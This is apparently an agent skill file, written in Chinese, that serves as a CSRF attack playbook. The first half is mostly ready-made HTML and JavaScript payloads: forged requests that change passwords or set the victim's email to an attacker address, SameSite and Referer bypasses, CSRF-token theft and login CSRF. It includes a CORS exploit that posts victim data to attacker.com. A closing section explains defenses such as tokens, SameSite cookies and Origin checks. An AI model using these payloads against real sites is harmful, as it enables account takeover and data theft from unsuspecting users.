---
name: csrf
description: Use when encountering csrf攻击技术 - 绕过samesite、token、referer验证，json csrf，自动化利用
---

# CSRF跨站请求伪造

## Info

- **Domain**: web
- **Tags**: web, csrf

## GET请求CSRF
```html
<img src="http://target.com/api/delete?id=1">
<iframe src="http://target.com/api/delete?id=1" style="display:none"></iframe>
<script>fetch('http://target.com/api/delete?id=1', {credentials:'include'});</script>
```

## POST请求CSRF
```html
<form action="http://target.com/change-password" method="POST" id="csrf">
  <input type="hidden" name="password" value="hacked123">
</form>
<script>document.getElementById('csrf').submit();</script>
```

## JSON CSRF
```html
<form action="http://target.com/api/update" method="POST" enctype="text/plain">
  <input type="hidden" name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
<!-- 发送: {"email":"attacker@evil.com","ignore":"="} -->
```

## SameSite绕过

### SameSite=Lax绕过
```html
<!-- Lax允许顶级导航GET请求 -->
<a href="http://target.com/api/action">Click</a>
<form action="http://target.com/api/action" method="GET">
<meta http-equiv="refresh" content="0;url=http://target.com/api/action">
window.location = "http://target.com/api/action";

<!-- 2分钟窗口期: Chrome在登录后2分钟内允许POST携带Cookie -->
```

### 子域名绕过
```
攻击者控制子域名 attacker.target.com 可绕过SameSite
```

### SameSite=None利用
```
需要Cookie设置了 SameSite=None; Secure
构造HTTPS攻击页面即可
```

## Token绕过

### Token泄露 (XSS+CSRF)
```javascript
fetch('http://target.com/profile')
  .then(r => r.text())
  .then(html => {
    const token = html.match(/csrf_token.*?value="([^"]+)"/)?.[1];
    fetch('http://target.com/api/action', {
      method: 'POST',
      credentials: 'include',
      body: JSON.stringify({token, action: 'delete'})
    });
  });
```

### Token验证缺陷
```html
<!-- 只验证格式 -->
<input type="hidden" name="csrf_token" value="anything">

<!-- Token不绑定Session，使用其他用户的Token -->
<!-- 只检查Token存在 -->
<input type="hidden" name="token" value="">
```

## Referer绕过

```html
<!-- 正则缺陷: Referer包含target.com -->
http://target.com.attacker.com/csrf.html
http://attacker.com/target.com/csrf.html

<!-- 空Referer -->
<meta name="referrer" content="no-referrer">
<iframe src="data:text/html,<form...></form>"></iframe>

<!-- HTTPS到HTTP降级不发送Referer -->
```

## CORS配置错误利用
```javascript
// Access-Control-Allow-Origin: * + Access-Control-Allow-Credentials: true
fetch('http://target.com/api/sensitive', {credentials: 'include'})
  .then(r => r.json())
  .then(data => fetch('http://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  }));
```

## 登录CSRF
```html
<!-- 强制用户登录攻击者账户 -->
<form action="http://target.com/login" method="POST">
  <input type="hidden" name="username" value="attacker">
  <input type="hidden" name="password" value="attacker_pass">
</form>
<script>document.forms[0].submit();</script>
```

## 自动化检测
```
Burp Suite: 右键请求 -> Generate CSRF PoC

检测清单:
[ ] Token验证是否存在
[ ] Token是否绑定Session
[ ] Referer验证
[ ] SameSite属性
[ ] CORS配置
[ ] JSON请求Content-Type验证
```

## PoC模板
```html
<form action="http://target.com/api/action" method="POST" id="csrf">
  <input type="hidden" name="param" value="value">
</form>
<script>document.getElementById('csrf').submit();</script>
```

## 防护策略

### 双重提交 Cookie
```
服务器每次请求返回 CSRF 令牌，要求随请求一起发送。
攻击者无法获取该令牌，即使伪造请求也无效。
```

### 验证 Referer/Origin 头
```
优先判断 Origin 字段
如果 Origin 不存在，再判断 Referer
确保请求来自受信任的源
注意：IE11 跨站 CORS 请求不携带 Origin
302 重定向后 Origin 丢失
```

### SameSite Cookie 属性
```
Set-Cookie: foo=1; Samesite=Strict    # 任何跨域请求都不携带
Set-Cookie: bar=2; Samesite=Lax       # 仅 GET 链接跳转携带
Set-Cookie: baz=3; Samesite=None      # 需要 Secure 标志

Strict: 最安全，但用户体验差（每次跨域访问需重新登录）
Lax: 平衡安全和体验，推荐使用
None: 最不安全，仅用于特定场景
```

### 双重 Cookie 验证
```
1. 用户访问时注入随机 Cookie（如 csrfcookie=v8g9e4ksfhw）
2. 前端请求时将 Cookie 值添加到 URL 参数或请求头
3. 后端验证 Cookie 中的值与参数是否一致
注意：子域名被 XSS 攻击时可被利用，不是最佳方案
```

### Token 验证（主流方案）
```
Token 存储在 localStorage 中
每次请求通过请求头携带
只要没有 XSS 漏洞泄露 Token，CSRF 攻击就无法成功
```

### 后端接口安全
```
- 严格管理上传接口，防止非预期内容（如 HTML）
- 添加 Header: X-Content-Type-Options: nosniff
- 用户上传的图片进行转存或校验，不使用用户直接提供的链接
```

## CSRF + XSS 组合攻击
```
如果页面存在 XSS，可以先通过 XSS 窃取 Token
然后用 Token 发起 CSRF 请求
所以 Token 方案的前提是页面没有 XSS 漏洞
```